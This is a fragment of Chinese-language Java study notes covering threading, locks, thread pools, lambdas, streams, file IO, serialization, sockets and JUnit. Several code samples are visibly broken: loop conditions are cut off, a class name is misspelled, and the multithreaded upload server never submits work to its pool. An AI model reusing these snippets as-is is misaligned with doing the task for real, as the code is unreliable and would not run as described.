else { //产生的是自定义的编译异常 throw new Un18Exception(\"年龄非法异常\"); } } 多线程 并行：同一时刻，多个指令在多个CPU同时执行 并发：同一时刻，多个指令在单个CPU交替执行 实现多线程 - 继承Thread类 //1.自定义类继承Thread，重写run方法（线程要执行的代码） public class MyTread extends Thread { @Override public void run() { //获取线程名称 String name = getName(); for (int i = 1; i public static void main(String[] args) { //2.创建线程对象 //创建线程时，线程默认的名字Thread-0 MyThread mt = new MyThread(); //线程创建之后，可以设置线程名称 mt.setName(\"线程1\"); //3.启动线程,JVM会自动执行run方法 mt.start(); MyThread mt2 = new MyThread(); mt2.setName(\"线程2\"); mt2.start(); } 实现多线程 - 实现Runnable接口 //1.自定义类实现Runnable接口，重写run方法 public class MyRun implements Runnable{ //线程要执行的功能 @Override public void run() { for (int i = 1; i public static void main(String[] args) { //2.创建任务类对象 MyRun mr = new MyRun(); //3.创建Thread类对象，并将任务对象作为构造方法的参数 Thread t = new Thread(mr); //4.调用start方法，启动线程，(自动执行run方法的代码) t.start(); for (int i = 1; i 两种方式对比 | 方式 | 优点 | 缺点 | | ---------------- | -------------------------------------------- | -------------------------------------------- | | 继承Thread类 | 编程较简单，子类可以直接使用Thread类的方法 | 扩展性差，子类不能再继承其他类 | | 实现Runnable接口 | 扩展性强，任务类实现接口后还可以继承其他的类 | 编程较复杂，任务类不能直接使用Thread类的方法 | 线程常用方法 | 方法 | 方法说明 | | --------------------------------------- | ----------------------------------------------------------- | | String getName( ) | 获取当前线程名称 | | void setName(String name) | 设置线程名称 | | static Thread currentThread( ) | 获取当前正在执行的线程对象 | | static void sleep(long time) | 让线程休眠指定的时间，单位为毫秒。（休眠时让出CPU执行权） | | void setPriority(int newPriority) | 设置线程优先级（1~10个等级，10为最高优先级，5为默认优先级） | | int getPriority( ) | 获取线程优先级 | 线程优先级从低到高分别有1~10级，通常CPU会优先执行优先级较高的线程任务。但这也不是绝对的，因为线程执行还是有随机性，只是概率上来说优先级越高的线程越有机会先执行 线程安全 当多个线程访问共享数据，且多个线程对共享数据有更新操作时，就容易出现线程安全问题。Java中提供了同步机制来解决线程安全问题。实现方式有三种 同步代码块 //同步代码块 synchronized(同步锁){ 有线程安全问题的代码 } //卖票任务 public static void main(String[] args) { //创建任务 Ticket ticket = new Ticket(); //创建三个线程，模拟3个窗口卖票 Thread t1 = new Thread(ticket,\"窗口1\"); Thread t2 = new Thread(ticket,\"窗口2\"); Thread t3 = new Thread(ticket,\"窗口3\"); //启动线程，进行售票 t1.start(); t2.start(); t3.start(); } //同步代码块实现 public class Ticket implements Runnable{ private static int total = 100; //总票数 private static Object obj = new Object(); //模拟窗口卖票 @Override public void run() { String name = Thread.currentThread().getName(); //获取线程名称 //一直在卖票 while (true){ //同步代码块，线程要先获取锁对象，才能进入代码块，代码块执行结束就释放锁 //锁要保证所有线程共用一个（唯一） //synchronized (obj) { //synchronized (this){ //代表当前类的对象，保证Ticket对象只被创建一次就可以 synchronized (Ticket.class) { //获取类的字节码，字节码在内存中是唯一的 if (total > 0) { total--; System.out.println(name + \"卖票成功，剩余票数：\" + total); } else { break; } } //休眠不是必须的代码，只是为了更好出现并发效果 //其他没有抢到锁的线程会进入休眠，若执行线程的时间太短，则再次抢锁时，会比其他休眠的线程具有优势 try { Thread.sleep(10); } catch (InterruptedException e) { e.printStackTrace(); } } } } 同步方法 锁的特点 实例方法：同步锁对象就是this，即方法的调用者 静态方法：同步锁对象为当前类的class对象 //同步方法 修饰符 synchronized 返回值类型 方法名（参数列表）{ 方法体； } //同步方法实现 public class Ticket implements Runnable { private static int total = 100; //总票数 //模拟窗口卖票 @Override public void run() { //一直在卖票 while (true) { sale(); if(total==0){ break; } try { Thread.sleep(10); } catch (InterruptedException e) { e.printStackTrace(); } } } //定义同步方法，把有安全问题的代码写在方法中 public synchronized void sale(){ String name = Thread.currentThread().getName(); //获取线程名称 if (total > 0) { total--; System.out.println(name + \"卖票成功，剩余票数：\" + total); } } } 同步代码块和同步方法的区别 同步方法是锁住方法中所有的代码（执行效率更慢）；同步代码块可以锁定指定代码，锁的控制粒度更细 同步方法不能指定锁对象，同步代码块可以指定锁对象 Lock锁机制 //Lock锁 Lock lock = new ReentrantLock();//可重入锁 try{ lock.lock();//加锁 需要同步处理的代码； } finally { lock.unlock();//在finally块中，保证锁一定会被释放 } //卖票任务 public class Ticket implements Runnable { private static int total = 100; //总票数 private static Lock lock = new ReentrantLock(); //可重入锁 //模拟窗口卖票 @Override public void run() { String name = Thread.currentThread().getName(); //获取线程名称 //一直在卖票 while (true) { try { lock.lock();//加锁,线程要执行代码，必须先获取锁 if (total > 0) { total--; System.out.println(name + \"卖票成功，剩余票数：\" + total); } else { break; } }finally { lock.unlock();//解锁的代码一定要执行 } try { Thread.sleep(10); } catch (InterruptedException e) { e.printStackTrace(); } } } } Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-03-15 11:26 "},"Java笔记/Day09-线程池+Lambda+Stream流.html":{"url":"Java笔记/Day09-线程池+Lambda+Stream流.html","title":"Day09-线程池+Lambda+Stream流","keywords":"","body":"线程死锁 容易产生死锁的条件 有多把锁 有多个线程 有同步代码块嵌套 线程等待和唤醒 以下的方法都来自Object类 方法都必须在同步代码块中使用锁对象进行调用 notify() 和 notifyAll() 方法并不释放锁，只是告诉在等待锁的线程可以去参与获得锁的竞争了，但被唤醒的线程不是马上得到锁，因为锁还在别人手里没释放 | 方法名 | 说明 | | ---------------- | ------------------------------------------------------------ | | void wait() | 让当前线程释放锁并进入等待，直到被唤醒 | | void notify() | 唤醒正在等待锁的单个线程，如果有多个线程同时在等待，notify() 方法只会随机唤醒某个线程 | | void notifyAll() | 唤醒正在等待锁的所有线程 | 线程状态 在Thread.State枚举类中，定义了线程的六种状态 新建状态NEW 可运行状态RUNNABLE 终止状态TERMINATED 阻塞状态BLOCKED 无限等待状态WAITING 计时状态TIMED_WAITING 面试题 wait和sleep的区别 sleep不释放锁；wait会释放锁 sleep休眠时间到就会自动醒来；wait会无限等待，直到被唤醒，唤醒后还需重新竞争锁 sleep是Thraead类的静态方法；wait是Object类的方法，wait方法要在同步机制中使用锁调用 线程池 优势 提高响应速度，减少了创建新线程的时间 降低资源消耗，重复利用线程池中线程，不需要每次都创建、销毁 便于线程管理，线程池可以集中管理并发线程的数量 创建线程池 Executors类是线程池的工具类 | 方法名 | 说明 | | ------------------------------------------------------- | ---------------------------------- | | static ExecutorService newFixedThreadPool(int nThreads) | 创建一个线程池，参数为池中的线程数 | 使用线程池 ExecutorService代表线程池 创建任务 实现Runnable接口，重写run方法 实现Callable接口，重写call方法 | 方法名 | 说明 | | ------------------------ | ---------------------- | | submit(Runnable task) | 提交Runnable类型的任务 | | submit(Callable task) | 提交Callable类型的任务 | | void shutdown() | 关闭线程池（谨慎使用） | 线程池callable实现 public static void main(String[] args) throws ExecutionException, InterruptedException { //创建线程池 ExecutorService pool = Executors.newFixedThreadPool(2); MyCall mc = new MyCall(); //提交Callable任务，返回值封装在Future对象中的，让Future对象等待返回结果，线程池可以执行任务 //如果是用Integer去接收，那么就需要等待线程完全执行完后才能获取到对象，用Future则可以不用等待即可继续执行后面的代码 Future f = pool.submit(mc); //从Future对象获取返回值 Integer a = f.get(); //如果线程没执行完,get方法会一直阻塞，直到线程返回结果 System.out.println(\"a:\"+a); } /* Callable ：泛型V就是线程执行完的返回值 */ public class MyCall implements Callable { //和run方法一样，都是线程去执行的任务 @Override public Integer call() throws Exception { String name = Thread.currentThread().getName(); System.out.println(name+\"线程执行了...\"); Thread.sleep(1000*60); return 666; } } 线程池底层核心参数（面试） Lambda Lambda表达式是JDK8开始的一种新语法形式 作用：简化函数式接口的匿名内部类的代码写法 使用前提：必须是接口，接口中有且仅有一个抽象方法 @FunctionalInterface注解：标记该接口必须是满足函数式接口 #简化格式： (匿名内部类被重写方法的形参列表) -> { 被重写方法的方法体代码 } 进一步省略写法： 参数类型可以省略不写 如果只有一个参数，()也可以省略 如果方法体代码只有一行代码，可以省略大括号不写，同时要省略分号；如果这行代码是return语句，return也要省略不写 public class LambdaDemo3 { public static void main(String[] args) { Integer[] ages1 = {34, 12, 42, 23}; /**Comparator比较器排序 参数一：被排序的数组 必须是引用类型的元素 参数二：匿名内部类对象，代表了一个比较器对象。 */ //原始写法 /* Arrays.sort(ages1, new Comparator() { @Override public int compare(Integer o1, Integer o2) { return o2 - o1; // 降序 } }); */ /* Arrays.sort(ages1, (Integer o1, Integer o2) -> { return o2 - o1; // 降序 }); */ /* Arrays.sort(ages1, ( o1, o2) -> { return o2 - o1; // 降序 }); */ //最终写法 Arrays.sort(ages1, ( o1, o2 ) -> o2 - o1 ); System.out.println(Arrays.toString(ages1)); } } 方法引用 方法引用是java8的新特性之一， 可以直接引用已有Java类或对象的方法或构造器。方法引用与Lambda表达式结合使用，可以进一步简化代码 引用格式 对象名::成员方法 类名::静态方法 类名::new 使用前提 Lambda表达式中仅仅调用了一个方法 调用的方法与要实现的抽象方法的参数和返回值一致 演示 public class test { public static void main(String[] args) { ArrayList list = new ArrayList<>(); //遍历集合 list.forEach(new Consumer() { @Override public void accept(Integer num) { System.out.println(num); } }); //Lambda简化 list.forEach((Integer num) -> { System.out.println(num); }); list.forEach(num -> System.out.println(num)); //使用方法引用简化 list.forEach(System.out::println); } } Stream流 创建Stream流的方式 ArrayList list = new ArrayList<>(); Collections.addAll(list,11,22,33,44); //方式1：通过集合获取流 （调用集合的stream方法） Stream s1 = list.stream(); //方式2：使用静态方法of直接创建流 Stream s2 = Stream.of(11, 22, 33, 44, 55); 常用方法 | 成员方法 | 方法作用 | 返回值类型 | 方法种类 | | -------- | ---------- | ---------- | -------- | | filter | 过滤 | Stream | 中间方法 | | limit | 取用前几个 | Stream | 中间方法 | | skip | 跳过前几个 | Stream | 中间方法 | | map | 映射 | Stream | 中间方法 | | count | 统计个数 | long | 终结方法 | | forEach | 逐一处理 | void | 终结方法 | Stream收集到数组 Stream st = Stream.of(\"11\", \"22\", \"33\"); Object[] arr = st.toArray(); Stream收集到集合 //1. 数据收集到List集合 Stream st = Stream.of(\"11\", \"22\", \"33\"); List list = st.collect(Collectors.toList()); //2. 数据收集到Set集合 Stream st = Stream.of(\"11\", \"22\", \"33\"); Set set = st.collect(Collectors.toSet()); 使用注意 一个Stream流对象只能操作一次 调用中间方法会返回新流，以便下次操作使用 终结方法如果没调用，中间方法也不会执行 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-03-14 22:04 "},"Java笔记/Day10-File+IO流.html":{"url":"Java笔记/Day10-File+IO流.html","title":"Day10-File+IO流","keywords":"","body":"File File类构造器：通过路径名字符串来创建File对象 在windows中路径支持：\\和/ 默认是\\ Linux/MacOS: 路径只支持 / 字符串中的\\要写两个：\\\\ // 1.File(String pathname) 通过字符串路径创建File对象(重要) 定位到一个文件或文件 File file = new File(\"D:\\\\MyFileTest\\\\aaa\"); // 2.File(String parent, String child) 通过父路径和子路径创建File对象 File file1 = new File(\"D:\\\\MyFileTest\", \"aaa\"); // 3.File(File parent, String child) 通过父路径File对象和子路径创建File对象 File fileParent = new File(\"D:\\\\MyFileTest\"); File file2 = new File(fileParent, \"aaa\"); 绝对路径：从盘符开始 相对路径：默认从当前项目下开始 File类功能 | 方法名 | 说明 | | ----------------------------------- | ---------------------- | | public boolean creatNewFile() | 创建一个新的文件 | | public boolean mkdir() | 创建一个单级文件夹 | | public boolean mkdirs() | 创建一个多级文件夹 | | public boolean delete() | 删除文件或文件夹 | | public boolean isDirectory() | 判断是否是文件夹 | | public boolean isFile() | 判断是否是文件 | | public boolean exists() | 判断是否存在 | | public String getAbsolutePath() | 返回File对象的绝对路径 | | public String getName() | 获取名字 | | public String getParent() | 获取父路径 | | public long length() | 获取文件大小 | 删除目录注意事项 delete方法直接删除不走回收站 如果是一个文件，直接删除；如果是文件夹，只能是空文件夹才能删除 File类遍历 public static void main (String[]args){ // 创建File对象 File file = new File(\"D:\\\\MyFileTest\"); //listFiles只能使用文件夹来调用，使用文件调用会返回空指针 // public File[] listFiles() 显示文件夹中的所有内容,返回File数组 File[] files = file.listFiles(); for (File file1 : files) { System.out.println(file1); } } 递归：方法自己调用自己 递归要有结束条件，递归次数不能太多，否则会溢出 文件搜索 public static void main (String[]args){ // 1.创建一个File对象定位aaa文件夹 File file = new File(\"D:\\\\MyFileTest\\\\aaa\"); // 2.定义一个方法listJava(File dir), 列出某个文件夹中的所有java文件 listJava(file); } public static void listJava (File file){ // 2.1.调用listFiles()显示文件夹中的所有内容 File[] files = file.listFiles(); // 2.2.遍历获取每个内容 for (File f : files) { // 2.3.判断如果是文件,并且是.java文件,打印这个文件 if (f.isFile()) { if (f.getName().endsWith(\".java\")) { System.out.println(f); } } else { // 2.4.如果是文件夹,再次调用listJava listJava(f); } } } IO流 注意：输入和输出都是从程序的角度来说的 IO流操作步骤 创建流对象 相关操作 关闭流（关闭流后再操作会报错） String和byte的转换 | 方法名 | 说明 | | -------------------------------------------- | ---------------------------- | | byte[] getBytes() | 将String的内容转成byte[] | | String(byte bytes[]) | 将byte[]的内容转成String | | String(byte[] bytes, int offset, int length) | 将byte[]的部分内容转成String | // String转byte[] String str = \"你好\"; byte[] bytes = str.getBytes(); System.out.println(Arrays.toString(bytes)); byte[] buf = {65, 66, 67, 68, 69}; // byte[]转String System.out.println(new String(buf)); // 转数组的一部分 System.out.println(new String(buf, 0, 3)); 字节流复制文件 【注意】输入流未关闭的情况下，输出流操作同一路径文件，会造成冲突；输入流尚未关闭仍然占用着原文件，此时获取输出流，输出流会认为该文件不存在并重新创建同名文件覆盖原文件，而后输入流实际读取的是一个空文件，那么输出流写入的内容也为空，最后造成文件内容置空的现象 public static void main(String[] args) throws IOException { // 1.创建文件字节输入流 FileInputStream fis = new FileInputStream(\"study_day10\\\\abc\\\\xyz.png\"); // 2.创建文件字节输出流 FileOutputStream fos = new FileOutputStream(\"study_day10\\\\abc\\\\xiena.png\"); //3.循环读写，一次读多个字节，new byte[1024*8] 最好是1024的整数倍 byte[] buf = new byte[1024 * 8]; //存放读取的数据 int len; //读到的数量 while((len = fis.read(buf))!=-1){ //读到多少，写多少 fos.write(buf,0,len); } // 4.关闭资源 从下往上看，先开的后关 fos.close(); fis.close(); } 字符流复制文件 // 1.创建文件字符输入流 FileReader fir = new FileReader(\"study_day10\\\\abc\\\\3.txt\"); // 2.创建文件字符输出流 FileWriter fiw = new FileWriter(\"study_day10\\\\abc\\\\2.txt\"); // 3.循环读写 int len; char[] chars = new char[3]; while ((len = fir.read(chars)) != -1) { fiw.write(chars, 0, len); fiw.flush(); } // 4.关闭流 fiw.close(); fir.close(); 字符流追加和换行 // 获取文件对象; FileWriter fiw = new FileWriter(\"study_day10\\\\abc\\\\3.txt\",true); // 换行 fiw.write(\"\\r\\n\"); // 追加续写 fiw.write(\"努力学习\\r\\n赢取白富美\"); //关闭 fiw.close(); Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-03-17 10:28 "},"Java笔记/Day11-IO流+装饰模式.html":{"url":"Java笔记/Day11-IO流+装饰模式.html","title":"Day11-IO流+装饰模式","keywords":"","body":"IO流 字节流 FileInputStream int read()：读一个字节 int read(byte[] b)：读一个字节数组 FileOutputStream write(int b)：写一个字节 write(byte[] b)：写一个字节数组 write(byte[] b, int off, int len)：写一个字节数组的一部分 字符流 FileReader int read()：读一个字符 int read(char[] cbuf)：读一个字符数组 FileWriter write(int c)：写一个字符（会将参数b的八个低位写入输出流，忽略b的 24 个高位） write(char[] cbuf)：写一个字符数组 write(char[] cbuf, int off, int len)：写一个字符数组的一部分 write(String ste)：写一个字符串 write(String, int off, int len)：写一个字符串的一部分 注意点： 字节输出流FileOutputStream的write(int c)只能写入低位的8位数据 字符输出流FileWriter的writer(int c)只能写入低位的16位数据 异常处理 JDK1.7前 try { 可能有问题的代码； } catch （异常类名 变量名） { 处理异常的代码； } finally { 释放资源； } // JDK1.7以前处理IO流异常 FileReader fir = null; try { fir = new FileReader(\"study_day11\\\\abc\\\\666.txt\"); //出现异常 int b = fir.read(); } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } finally { try { //fir可能获取失败，所以要先判断后再关闭 if (fir != null) { fir.close(); } } catch (IOException e) { e.printStackTrace(); } } JDK1.7 try (创建流的代码) { 其他代码； } catch （异常类名 变量名）{ 处理异常的代码； } // JDK1.7处理IO流异常, 只有实现了AutoCloseable接口的类才能放入,会自动关闭流 try (FileReader fir2 = new FileReader(\"study_day11\\\\abc\\\\666.txt\"); FileWriter fiw = new FileWriter(\"study_day11\\\\abc\\\\666.txt\") ) { int b = fir2.read(); } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } 缓冲流 缓冲流的基本原理，是在创建流对象时，会创建一个内置的默认大小的缓冲区数组8KB，通过缓冲区读写，减少系统IO次数，从而提高读写的效率 字节流复制文件效率对比： 缓冲流读写一个字节比基本流读写一个字节快非常多 缓冲流读写一个字节数组和基本流读写一个字节数组差不多 【使用】如果使用读写一个字节时，建议使用缓冲流；如果使用读写一个字节数组，建议使用基本流 字符缓冲流新增功能： readLine（）读取一行数据返回，无数据返回null newLine()换行 BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(\"study_day11\\\\abc\\\\1.txt\")); //3.写数据 bos.write(97); //真正写数据的还是fos,只不过通过一个8192的数组，减少IO次数 //4.关闭流 bos.close(); //fos.close(); 在缓冲流里面会帮助关闭 字符集 ASCII使用一个字节存储一个字符，一个字节是8位 GBK中一个中文以两个字节存储，英文仍是一个字节（兼容ASCII） Unicode（兼容ASCII） UTF-8：一个中文以三个字节存储 转换流 编码：将字符转成二进制 解码：将二进制解析成文字 // 1.使用GBK编码读取文件内容 InputStreamReader isr = new InputStreamReader(new FileInputStream(\"study_day11\\\\abc\\\\china_gbk.txt\"),\"GBK\"); // 2.使用UTF-8编码写字符数据到文件 OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(\"study_day11\\\\abc\\\\china_utf22.txt\"),\"UTF-8\"); // 3.循环读写 int len; while ((len = isr.read())!=-1){ osw.write(len); } // 4.关闭文件 osw.close(); isr.close(); 对象流 ObjectOutputStream序列化：将对象的数据保存到文件 ObjectInputStream反序列化：读取文件中的数据到程序中形成对象 /*注意: 1.对象要序列化到文件,这个类要实现Serializable接口 Serializable标记接口. 主要给JVM虚拟机看的.看到Serializable接口会把对象转成字节数据.我们就可以通过流写到文件中 2.被transient修饰的成员变量不会保存到文件 3.InvalidClassException: 无效的类异常（版本号对不上） 出现的步骤: 1.执行 writeObject 把对象保存到文件 2.修改 Person 类 3.执行 readObject 读取文件的对象 解决方法： 在String类找到版本号的编写方式，版本号本身可以随意修改*/ public static void main(String[] args) throws IOException { // ObjectOutputStream: 包装加强.把对象保存到文件 //1.创建对象输出流，把基本输出流当做参数传递 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"study_day11\\\\abc\\\\person.txt\")); //2.创建对象 Person person = new Person(\"刘亦菲\", 18); //3.将对象写进文件里 oos.writeObject(person); //4.关闭流 oos.close(); //1.创建对象输入流 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"study_day11\\\\abc\\\\person.txt\")); //2.创建对象接收读取内容 Object o = ois.readObject(); //3.打印输出 System.out.println(o); } 打印流 //创建打印流 PrintStream ps = new PrintStream(\"study_day11\\\\abc\\\\1.txt\"); //打印数据 ps.print(97);//原样输出,参数写什么就打印什么 ps.print(true); ps.print(\"我是一个字符串\"); //换行 下一句换行 ps.println(\"我是换行\"); ps.print(\"我被换行了\"); //System.out.println(); 常用的打印流 //ps.write(97); 不要使用写的方法，这个是普通的写 //关闭流 ps.close(); Properties Properties类表示属性集。保存的文件后缀是.properties结尾，里面的内容一行一个 key=value，常作为软件的配置文件 方法名 说明 Object setProperty(String key, String value) 添加键和值，键和值都是String类型 String getProperty(String key) 通过键获取值 Set stringPropertyNames() 获取所有的键 void load(Reader reader) 从输入字符流读取属性列表（键和值） void load(InputStream inStream) 从输入字节流读取属性列表（键和元素对） void store(Writer writer, String comments) 将Properties中的键和值写入输出字符流中 void store(OutputStream out, String comments) 将Properties中的键和值写入输出字节流中 //Properties作为Map集合的使用 Properties pp = new Properties(); //设置值 pp.setProperty(\"姓名\", \"刘亦菲\"); pp.setProperty(\"年龄\", \"18\"); //获取值 String name = pp.getProperty(\"姓名\"); String age = pp.getProperty(\"年龄\"); System.out.println(name + \":\" + age); //遍历 pp.forEach((k, v) -> System.out.println(k + \":\" + v)); // Properties属性集保存数据到文件 public static void test01() throws IOException { //1.创建properties对象 Properties pp = new Properties(); pp.setProperty(\"username\",\"admin\"); pp.setProperty(\"password\",\"123456\"); //创建字符输出流 FileWriter fiw = new FileWriter(\"study_day11\\\\abc\\\\config.properties\"); //调用properties存储方法 第二个参数是个注释 pp.store(fiw,\"\"); //关闭流 fiw.close(); } // 加载文件中数据到Properties属性集中 public static void test02() throws IOException { //1.创建properties对象 Properties pp = new Properties(); System.out.println(\"pp = \" + pp); //读取properties文件的数据 FileReader fir = new FileReader(\"study_day11\\\\abc\\\\config.properties\"); //获取数据 pp.load(fir); fir.close(); System.out.println(\"pp = \" + pp); } 装饰模式 作用：在不改变原类的基础上, 动态地增强或扩展一个类的功能 装饰设计模式的三个角色：原对象、装饰对象、共同的接口 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-19 10:46 "},"Java笔记/Day12-网络编程+junit.html":{"url":"Java笔记/Day12-网络编程+junit.html","title":"Day12-网络编程+junit","keywords":"","body":"网络编程 概念 常见软件架构：Client-Server（CS）客户端-服务端、Browser-Server（BS）浏览器-服务端 三要素：IP地址、端口号（0-65535）、协议 UDP特点：不需要连接、速度快、一次最多发送64k，易丢失数据 TCP特点：需要连接、速度慢、没有大小限制、不易丢失数据 UDP 注意是DatagramSocket和DatagramPacket两类 接收端是在DatagramSocket(int port)写端口号 发送端是在DatagramPacket(byte buf[], int offset, int length,InetAddress address, int port)写IP地址和端口号 //服务端，注意先运行服务端 public class UDPReceiver { public static void main(String[] args) throws IOException { System.out.println(\"接收端启动!\"); // 1.创建接收端 DatagramSocket socket = new DatagramSocket(6666); // 2.创建空的数据包 byte[] buf = new byte[1024]; // 3.接收数据, 接收到的数据放到包中 DatagramPacket packet = new DatagramPacket(buf, buf.length); socket.receive(packet); //要获取接收后的长度 int length = packet.getLength(); System.out.println(new String(buf, 0, length)); // 4.关闭资源 socket.close(); } } //客户端 public class UDPSender { public static void main(String[] args) throws IOException { System.out.println(\"发送端启动!\"); // 1.创建发送端 DatagramSocket socket = new DatagramSocket(); // 2.创建数据包 byte[] buf = \"你好UDP!\".getBytes(); DatagramPacket packet = new DatagramPacket(buf, 0, buf.length, InetAddress.getByName(\"127.0.0.1\"), 6666); // 3.发送数据 socket.send(packet); // 4.关闭资源 socket.close(); } } TCP ServerSocket只需要在服务端创建 客户端需要在创建Socket对象的参数中明确服务端的IP地址和端口号 //服务端 public class TCPServer { public static void main(String[] args) throws IOException { System.out.println(\"服务端启动啦!\"); // 1.创建TCP服务端 ServerSocket serverSocket = new ServerSocket(10086); // 3.同意客户端的请求, 如果没有客户端连接就一直等 Socket socket = serverSocket.accept(); // 5.得到输入流读取数据 InputStream in = socket.getInputStream(); byte[] buf = new byte[1024]; int len = in.read(buf); System.out.println(\"服务端接收到:\" + new String(buf, 0, len)); // 6.输出流发送数据 OutputStream out = socket.getOutputStream(); out.write(\"好呀！老地方见！\".getBytes()); // 关闭资源 out.close(); in.close(); socket.close(); serverSocket.close(); } } //客户端 public class TCPClient { public static void main(String[] args) throws IOException { System.out.println(\"客户端启动啦!\"); // 2.创建客户端 Socket socket = new Socket(\"127.0.0.1\", 10086); // 4.输出流发送数据 OutputStream out = socket.getOutputStream(); out.write(\"你好约吗?\".getBytes()); // 7.输入流读取数据 InputStream in = socket.getInputStream(); byte[] buf = new byte[1024]; int len = in.read(buf); System.out.println(\"客户端收到:\" + new String(buf, 0, len)); // 关闭资源 从下往上关闭流 in.close(); out.close(); socket.close(); } } 文件上传 //服务端 public class UploadServer { public static void main(String[] args) throws IOException { System.out.println(\"文件上传服务端启动啦!\"); // 1.创建服务端 ServerSocket serverSocket = new ServerSocket(9999); // 2.同意客户端的连接 Socket socket = serverSocket.accept(); System.out.println(\"开始上传！\"); // 3.得到Socket输入流 InputStream in = socket.getInputStream(); // 4.创建文件输出流 FileOutputStream fos = new FileOutputStream(\"study_day12\\\\upload\\\\1.png\"); // 5.循环读写数据 byte[] buf = new byte[1024 * 8]; int len; while ((len = in.read(buf)) != -1) { fos.write(buf, 0, len); } System.out.println(\"服务端接收完成!\"); // 6.得到Socket的输出流写数据 OutputStream out = socket.getOutputStream(); out.write(\"上传完成！\".getBytes()); // 7.关闭 out.close(); fos.close(); in.close(); socket.close(); serverSocket.close(); } } //客户端 public class UploadClient { public static void main(String[] args) throws IOException { System.out.println(\"文件上传客户端启动啦!\"); // 1.创建客户端 Socket socket = new Socket(\"127.0.0.1\", 9999); // 2.创建文件输入流 FileInputStream fis = new FileInputStream(\"study_day12\\\\abc\\\\xyz.png\"); // 3.得到Socket的输出流 OutputStream out = socket.getOutputStream(); // 4.循环读取数据 byte[] buf = new byte[1024 * 8]; int len; while ((len = fis.read(buf)) != -1) { // 输出流发送数据 out.write(buf, 0, len); } System.out.println(\"客户端发送文件完毕！\"); socket.shutdownOutput(); //把客户端的流关掉，服务端就会停止获取输入 // 5.得到Socket输入流读取数据 InputStream in = socket.getInputStream(); //buf 重复利用 len = in.read(buf); System.out.println(\"客户端收到:\" + new String(buf, 0, len)); // 6.关闭资源 in.close(); out.close(); fis.close(); socket.close(); } } 文件上传-多线程 //服务端 public class UploadServer { public static void main(String[] args) throws IOException { System.out.println(\"文件上传服务端启动啦!\"); // 1.创建服务端 ServerSocket serverSocket = new ServerSocket(9999); //多人同时上传 ExecutorService pool = Executors.newFixedThreadPool(10); while (true) { // 2.同意客户端的连接 //不能放进线程任务中，否则就会在没有获取连接的情况下开线程，并且相当于开了10个服务，而不是10个线程 Socket socket = serverSocket.accept(); UploadRunnable up = new UploadRunnable(socket); } //serverSocket.close();持续等待就不能关闭服务端 } } //创建线程 public class UploadRunnable implements Runnable { //成员变量 private Socket socket; //构造方法给成员变量赋值 public UploadRunnable(Socket socket) { this.socket = socket; } @Override public void run() { try { System.out.println(\"开始上传！\"); // 3.得到Socket输入流 InputStream in = socket.getInputStream(); // 4.创建文件输出流 //给文件命名，JDK自带的，能够生成一个随机的字符串 String str = UUID.randomUUID().toString(); FileOutputStream fos = new FileOutputStream(\"study_day12\\\\upload\\\\\" + str + \".png\"); // 5.循环读写数据 byte[] buf = new byte[1024 * 8]; int len; while ((len = in.read(buf)) != -1) { fos.write(buf, 0, len); } System.out.println(\"服务端接收完成!\"); // 6.得到Socket的输出流写数据 OutputStream out = socket.getOutputStream(); out.write(\"上传完成！\".getBytes()); // 7.关闭 out.close(); fos.close(); in.close(); socket.close(); } catch (IOException e) { e.printStackTrace(); } } } //客户端 public class UploadClient { public static void main(String[] args) throws IOException { System.out.println(\"文件上传客户端启动啦!\"); int n = 0; //模拟有20个用户来访问 while (n { try { // 1.创建客户端 Socket socket = new Socket(\"127.0.0.1\", 9999); // 2.创建文件输入流 FileInputStream fis = new FileInputStream(\"study_day12\\\\abc\\\\xyz.png\"); // 3.得到Socket的输出流 OutputStream out = socket.getOutputStream(); // 4.循环读写数据 byte[] buf = new byte[1024 * 8]; int len; while ((len = fis.read(buf)) != -1) { out.write(buf, 0, len); } System.out.println(\"客户端发送文件完毕！\"); socket.shutdownOutput(); //把客户端的流关掉，服务端就会停止获取输入 // 5.得到Socket输入流读取数据 InputStream in = socket.getInputStream(); //buf 重复利用 len = in.read(buf); System.out.println(\"客户端收到:\" + new String(buf, 0, len)); // 6.关闭资源 in.close(); out.close(); fis.close(); socket.close(); } catch (IOException e) { e.printStackTrace(); } } ).start(); } } } 模拟网站服务器 public class WebServer { public static void main(String[] args) throws IOException { System.out.println(\"服务器启动啦!\"); // 1.创建TCP服务端 ServerSocket serverSocket = new ServerSocket(9527); // 2.同意客户端的请求 while (true) { // 2.同意客户端的请求 Socket socket = serverSocket.accept(); // 3.返回数据给浏览器(TCP客户端)HTTP协议在返回数据时有固定的格式 OutputStream output = socket.getOutputStream(); output.write(\"HTTP/1.1 200 OK\\r\\n\".getBytes()); // 告诉浏览器一切正常 output.write(\"Content-Type:text/html;charset=utf-8\\r\\n\".getBytes()); // 告诉浏览器返回的是一个html网页,是utf-8编码 output.write(\"\\r\\n\".getBytes()); output.write(\"\".getBytes()); } } } 单元测试 Junit是一个Java中常用的第三方单元测试工具，可对Java中的方法进行测试，提高代码测试效率 使用流程 编写测试方法 在测试方法上使用@Test 运行单元测试方法 使用要求 方法必须是public 返回值必须是void 不能有参数 常用注解 Junit 4.xx版本 | 注解名 | 说明 | | ------------ | ---------------------------------------------- | | @Test | 单元测试方法 | | @Before | 在每个测试的方法前运行 | | @After | 在每个测试的方法后运行 | | @BeforeClass | 在所有测试的方法前运行一次【方法必须是静态的】 | | @AfterClass | 在所有测试的方法后运行一次【方法必须是静态的】 | Junit 5.xx版本 | 注解名 | 说明 | | ----------- | -------------------------- | | @Test | 单元测试方法 | | @BeforeEach | 在每个测试的方法前运行 | | @AfterEach | 在每个测试的方法后运行 | | @BeforeAll | 在所有测试的方法前运行一次 | | @AfterAll | 在所有测试的方法后运行一次 | commons-io commons-io是apache提供的一组有关IO操作的类库，有两个主要的类FileUtils, IOUtils FileUtils主要方法 